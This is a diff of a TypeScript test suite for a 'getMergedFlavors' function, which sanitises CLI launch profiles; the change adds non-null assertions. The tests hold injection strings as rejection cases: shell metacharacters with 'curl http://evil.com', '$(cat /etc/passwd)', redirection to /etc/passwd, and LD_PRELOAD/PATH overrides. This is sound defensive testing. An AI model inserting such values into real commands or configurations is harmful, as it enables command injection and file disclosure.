@@ -34,7 +34,7 @@ describe("Adversarial: Flavor Merging", () => {
     // Circular env values (non-string) are dropped — flavor itself survives
     const result = getMergedFlavors("claude", flavors);
     expect(result.length).toBe(1);
-    expect(result[0].env?.["self"]).toBeUndefined();
+    expect(result[0]!.env?.["self"]).toBeUndefined();
   });
 
   it("deduplicates flavors with the same ID — first wins", () => {
@@ -67,7 +67,7 @@ describe("Adversarial: Flavor Merging", () => {
       },
     ];
     const result = getMergedFlavors("claude", flavors);
-    expect(result[0].env?.KEY).toBeUndefined();
+    expect(result[0]!.env?.KEY).toBeUndefined();
   });
 
   it("custom flavor shadows CCR flavor with same ID", () => {
@@ -83,8 +83,8 @@ describe("Adversarial: Flavor Merging", () => {
       { id: "danger", name: "Bad", env: { PATH: "/injected", LD_PRELOAD: "evil.so" } },
     ];
     const result = getMergedFlavors("claude", dangerous);
-    expect(result[0].env?.PATH).toBeUndefined();
-    expect(result[0].env?.LD_PRELOAD).toBeUndefined();
+    expect(result[0]!.env?.PATH).toBeUndefined();
+    expect(result[0]!.env?.LD_PRELOAD).toBeUndefined();
   });
 
   it("allows safe env vars through", () => {
@@ -96,8 +96,8 @@ describe("Adversarial: Flavor Merging", () => {
       },
     ];
     const result = getMergedFlavors("claude", safe);
-    expect(result[0].env?.ANTHROPIC_API_KEY).toBe("sk-test-123");
-    expect(result[0].env?.CLAUDE_MODEL).toBe("claude-opus-4-6");
+    expect(result[0]!.env?.ANTHROPIC_API_KEY).toBe("sk-test-123");
+    expect(result[0]!.env?.CLAUDE_MODEL).toBe("claude-opus-4-6");
   });
 });
 
@@ -106,34 +106,34 @@ describe("Adversarial: Flavor Merging", () => {
 describe("Adversarial: color validation (Bug — regex too permissive)", () => {
   it("rejects 5-digit hex color (#abcde) — not valid CSS", () => {
     const result = getMergedFlavors("claude", [{ id: "f1", name: "Bad Color", color: "#abcde" }]);
-    expect(result[0].color).toBeUndefined();
+    expect(result[0]!.color).toBeUndefined();
   });
 
   it("rejects 7-digit hex color (#1234567) — not valid CSS", () => {
     const result = getMergedFlavors("claude", [{ id: "f1", name: "Bad Color", color: "#1234567" }]);
-    expect(result[0].color).toBeUndefined();
+    expect(result[0]!.color).toBeUndefined();
   });
 
   it("accepts 3-digit hex color (#abc)", () => {
     const result = getMergedFlavors("claude", [{ id: "f1", name: "Short Color", color: "#abc" }]);
-    expect(result[0].color).toBe("#abc");
+    expect(result[0]!.color).toBe("#abc");
   });
 
   it("accepts 4-digit hex color with alpha (#abcd)", () => {
     const result = getMergedFlavors("claude", [{ id: "f1", name: "Alpha Short", color: "#abcd" }]);
-    expect(result[0].color).toBe("#abcd");
+    expect(result[0]!.color).toBe("#abcd");
   });
 
   it("accepts 6-digit hex color (#aabbcc)", () => {
     const result = getMergedFlavors("claude", [{ id: "f1", name: "Full Color", color: "#aabbcc" }]);
-    expect(result[0].color).toBe("#aabbcc");
+    expect(result[0]!.color).toBe("#aabbcc");
   });
 
   it("accepts 8-digit hex color with alpha (#aabbccdd)", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Full Alpha", color: "#aabbccdd" },
     ]);
-    expect(result[0].color).toBe("#aabbccdd");
+    expect(result[0]!.color).toBe("#aabbccdd");
   });
 });
 
@@ -144,14 +144,14 @@ describe("Adversarial: sanitizeEnv returns {} when all entries rejected (Bug —
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Injected", env: { MY_KEY: "val; injection", OTHER: "val | pipe" } },
     ]);
-    expect(result[0].env).toBeUndefined();
+    expect(result[0]!.env).toBeUndefined();
   });
 
   it("returns env=undefined (not {}) when all env keys are dangerous system vars", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "SysVars", env: { PATH: "/injected", LD_PRELOAD: "evil.so" } },
     ]);
-    expect(result[0].env).toBeUndefined();
+    expect(result[0]!.env).toBeUndefined();
   });
 });
 
@@ -160,7 +160,7 @@ describe("Adversarial: name validation rejects apostrophes (Bug — over-aggress
     // Apostrophes are common in names and display locally — not XSS-risk in this context
     const result = getMergedFlavors("claude", [{ id: "f1", name: "Don't touch" }]);
     expect(result).toHaveLength(1);
-    expect(result[0].name).toBe("Don't touch");
+    expect(result[0]!.name).toBe("Don't touch");
   });
 
   it('allows flavor name with double-quote ("My Config")', () => {
@@ -196,35 +196,35 @@ describe("Adversarial: customFlags shell injection (Bug — missing sanitization
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Inject", customFlags: "--flag; curl http://evil.com" },
     ]);
-    expect(result[0].customFlags).toBeUndefined();
+    expect(result[0]!.customFlags).toBeUndefined();
   });
 
   it("rejects customFlags containing pipe operator", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Pipe", customFlags: "--verbose | tee /tmp/out" },
     ]);
-    expect(result[0].customFlags).toBeUndefined();
+    expect(result[0]!.customFlags).toBeUndefined();
   });
 
   it("rejects customFlags containing command substitution", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Subst", customFlags: "--model $(cat /etc/passwd)" },
     ]);
-    expect(result[0].customFlags).toBeUndefined();
+    expect(result[0]!.customFlags).toBeUndefined();
   });
 
   it("allows safe customFlags with only dashes and alphanumerics", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Safe", customFlags: "--verbose --output-format json" },
     ]);
-    expect(result[0].customFlags).toBe("--verbose --output-format json");
+    expect(result[0]!.customFlags).toBe("--verbose --output-format json");
   });
 
   it("null-coerces customFlags to undefined when injection is detected", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Inject2", customFlags: "--flag; evil" },
     ]);
-    expect(result[0].customFlags).toBeUndefined();
+    expect(result[0]!.customFlags).toBeUndefined();
   });
 });
 
@@ -239,35 +239,35 @@ describe("Adversarial: flavor.args injection (Bug — unsanitized args array)", 
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Inject", args: ["--flag; curl http://evil.com"] },
     ]);
-    expect(result[0].args).toBeUndefined();
+    expect(result[0]!.args).toBeUndefined();
   });
 
   it("rejects args entries containing command substitution", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Subst", args: ["--model $(cat /etc/passwd)"] },
     ]);
-    expect(result[0].args).toBeUndefined();
+    expect(result[0]!.args).toBeUndefined();
   });
 
   it("rejects args entries containing pipe", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Pipe", args: ["--verbose | tee /tmp/out"] },
     ]);
-    expect(result[0].args).toBeUndefined();
+    expect(result[0]!.args).toBeUndefined();
   });
 
   it("rejects non-string args entries", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "NonStr", args: [{ nested: "bad" } as unknown as string] },
     ]);
-    expect(result[0].args).toBeUndefined();
+    expect(result[0]!.args).toBeUndefined();
   });
 
   it("allows safe args entries", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Safe", args: ["--model", "claude-opus-4-6", "--verbose"] },
     ]);
-    expect(result[0].args).toEqual(["--model", "claude-opus-4-6", "--verbose"]);
+    expect(result[0]!.args).toEqual(["--model", "claude-opus-4-6", "--verbose"]);
   });
 
   it("filters only dangerous entries and keeps safe ones", () => {
@@ -276,7 +276,7 @@ describe("Adversarial: flavor.args injection (Bug — unsanitized args array)", 
     ]);
     // Any dangerous entry should poison the whole args array (drop it entirely)
     // OR the implementation filters per-entry — either way, injection strings must not survive
-    const args = result[0].args;
+    const args = result[0]!.args;
     if (args !== undefined) {
       expect(args.every((a) => !a.includes(";") && !a.includes("$(") && !a.includes("|"))).toBe(
         true
@@ -304,7 +304,7 @@ describe("Adversarial: validateFlavor whitespace-only name (Bug — guard before
   it("still accepts a name with surrounding whitespace that has content", () => {
     const result = getMergedFlavors("claude", [{ id: "f1", name: "  Opus  " }]);
     expect(result).toHaveLength(1);
-    expect(result[0].name).toBe("Opus");
+    expect(result[0]!.name).toBe("Opus");
   });
 });
 
@@ -322,14 +322,14 @@ describe("Adversarial: validateFlavor whitespace-only name (Bug — guard before
 describe("Adversarial: sanitizeArgs empty strings (Bug — empty token allowed)", () => {
   it("filters a lone empty-string arg", () => {
     const result = getMergedFlavors("claude", [{ id: "f1", name: "Empty", args: [""] }]);
-    expect(result[0].args).toBeUndefined();
+    expect(result[0]!.args).toBeUndefined();
   });
 
   it("filters empty strings within a mixed-safe array", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Mixed", args: ["--verbose", "", "--output-format"] },
     ]);
-    expect(result[0].args).toEqual(["--verbose", "--output-format"]);
+    expect(result[0]!.args).toEqual(["--verbose", "--output-format"]);
   });
 });
 
@@ -338,13 +338,13 @@ describe("Adversarial: sanitizeArgs length cap (Bug — no per-arg limit)", () =
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Long", args: ["--flag=" + "a".repeat(10001)] },
     ]);
-    expect(result[0].args).toBeUndefined();
+    expect(result[0]!.args).toBeUndefined();
   });
 
   it("keeps args that are exactly at the 10 000-char limit", () => {
     const longButOk = "--flag=" + "a".repeat(9993); // 10 000 chars total
     const result = getMergedFlavors("claude", [{ id: "f1", name: "Ok", args: [longButOk] }]);
-    expect(result[0].args).toEqual([longButOk]);
+    expect(result[0]!.args).toEqual([longButOk]);
   });
 });
 
@@ -353,14 +353,14 @@ describe("Adversarial: sanitizeArgs ampersand injection (Bug — & not blocked)"
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Amp", args: ["--model=foo&evil"] },
     ]);
-    expect(result[0].args).toBeUndefined();
+    expect(result[0]!.args).toBeUndefined();
   });
 
   it("rejects args containing > — shell redirection operator", () => {
     const result = getMergedFlavors("claude", [
       { id: "f1", name: "Redir", args: ["--output>/etc/passwd"] },
     ]);
-    expect(result[0].args).toBeUndefined();
+    expect(result[0]!.args).toBeUndefined();
   });
 });
 
